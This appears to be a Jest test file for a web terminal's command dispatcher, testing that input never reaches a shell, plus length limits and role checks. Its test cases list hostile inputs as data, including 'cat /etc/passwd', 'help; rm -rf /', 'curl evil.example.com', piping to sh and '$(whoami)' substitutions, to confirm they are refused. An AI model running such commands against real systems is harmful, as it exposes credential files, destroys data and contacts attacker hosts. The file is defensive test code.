import {
    dispatch,
    register,
    listCommands,
    tokenize,
    CommandError,
    __resetRegistryForTests,
    type TerminalContext,
} from './commands';
import { registerBuiltins, __resetBuiltinsForTests } from './builtins';

const userCtx: TerminalContext = { userId: 'u1', email: 'op@scorpion.local', role: 'user' };
const adminCtx: TerminalContext = { userId: 'u2', email: 'admin@scorpion.local', role: 'admin' };

beforeEach(() => {
    __resetRegistryForTests();
    __resetBuiltinsForTests();
    registerBuiltins();
});

describe('dispatch — no path from input to execution', () => {
    // The whole feature rests on this. If any of these ever pass a string through
    // to something that executes it, the surface has become a shell.
    const shellAttempts = [
        'cat /etc/passwd',
        'help; rm -rf /',
        'help && curl evil.example.com',
        'help | sh',
        '$(whoami)',
        '`id`',
        'node -e "process.exit(1)"',
        '../../bin/sh',
    ];

    test.each(shellAttempts)('rejects %p as an unknown command', async (input) => {
        await expect(dispatch(input, adminCtx)).rejects.toThrow(CommandError);
    });

    test('rejects a chained command even when the first token is a real verb', async () => {
        // 'help; rm -rf /' must not run help and must not run rm. The trailing
        // tokens are inert arguments, but the verb lookup is what matters.
        await expect(dispatch('help; rm -rf /', adminCtx)).rejects.toThrow(/unknown command/);
    });

    test('a valid verb followed by shell metacharacters is refused, not quietly run', async () => {
        // These start with a real verb, so the unknown-command guard does not fire.
        // Nothing would execute either way, but printing help for `help | sh` reads
        // as though the pipe was honoured. maxArgs makes the refusal explicit.
        await expect(dispatch('help | sh', adminCtx)).rejects.toThrow(/takes no arguments/);
        await expect(dispatch('help && curl evil.example.com', adminCtx)).rejects.toThrow(/takes no arguments/);
    });

    test('a valid verb with hostile-looking arguments still only runs the handler', async () => {
        const handler = jest.fn().mockResolvedValue(['ok']);
        register({ name: 'probe', summary: 's', usage: 'probe', handler });

        await dispatch('probe ; rm -rf / $(id)', adminCtx);

        // Arguments arrive already split and are never reassembled into a string.
        expect(handler).toHaveBeenCalledWith([';', 'rm', '-rf', '/', '$(id)'], adminCtx);
    });
});

describe('dispatch — input bounds', () => {
    test('rejects input past the length cap', async () => {
        await expect(dispatch('a'.repeat(513), adminCtx)).rejects.toThrow(/too long/);
    });

    test('rejects control characters', async () => {
        await expect(dispatch('help\u0007', adminCtx)).rejects.toThrow(/control characters/);
    });

    test('rejects ANSI escape sequences', async () => {
        await expect(dispatch('\u001b[31mhelp', adminCtx)).rejects.toThrow(/control characters/);
    });

    test('rejects too many tokens', async () => {
        await expect(dispatch(`help ${'x '.repeat(40)}`, adminCtx)).rejects.toThrow(/too many arguments/);
    });

    test('blank input is a no-op, not an error', async () => {
        await expect(dispatch('   ', adminCtx)).resolves.toEqual({ lines: [], command: null });
    });
});

describe('dispatch — role enforcement', () => {
    test('denies a verb the caller\'s role does not allow', async () => {
        register({
            name: 'restricted',
            summary: 's',
            usage: 'restricted',
            allowedRoles: ['admin'],
            handler: async () => ['ran'],
        });

        await expect(dispatch('restricted', userCtx)).rejects.toThrow(/requires role admin/);
    });

    test('the handler is never invoked when the role check fails', async () => {
        const handler = jest.fn().mockResolvedValue(['ran']);
        register({ name: 'restricted', summary: 's', usage: 'restricted', allowedRoles: ['admin'], handler });

        await expect(dispatch('restricted', userCtx)).rejects.toThrow(CommandError);
        expect(handler).not.toHaveBeenCalled();
    });

    test('allows the verb for a permitted role', async () => {
        register({
            name: 'restricted',
            summary: 's',
            usage: 'restricted',
            allowedRoles: ['admin'],
            handler: async () => ['ran'],
        });

        await expect(dispatch('restricted', adminCtx)).resolves.toEqual({ lines: ['ran'], command: 'restricted' });
    });

    test('listCommands hides verbs the role cannot run', () => {
        register({ name: 'restricted', summary: 's', usage: 'restricted', allowedRoles: ['admin'], handler: async () => [] });

        expect(listCommands('user').map((c) => c.name)).not.toContain('restricted');
        expect(listCommands('admin').map((c) => c.name)).toContain('restricted');
    });
});

describe('registry', () => {
    test('duplicate registration throws rather than silently overwriting', () => {
        register({ name: 'dup', summary: 's', usage: 'dup', handler: async () => [] });
        expect(() => register({ name: 'dup', summary: 's', usage: 'dup', handler: async () => [] }))
            .toThrow(/duplicate command registration/);
    });
});

describe('builtins', () => {
    test('help lists only what the role may run', async () => {
        const { lines } = await dispatch('help', userCtx);
        expect(lines.join('\n')).toContain('whoami');
        expect(lines.join('\n')).toContain("role 'user'");
    });

    test('whoami reports the resolved identity, not anything client-supplied', async () => {
        const { lines } = await dispatch('whoami', adminCtx);
        expect(lines).toEqual(expect.arrayContaining([
            expect.stringContaining('admin@scorpion.local'),
            expect.stringContaining('u2'),
            expect.stringContaining('admin'),
        ]));
    });
});

describe('tokenize', () => {
    test('collapses runs of whitespace', () => {
        expect(tokenize('  gate   status  --env prod ')).toEqual(['gate', 'status', '--env', 'prod']);
    });
});
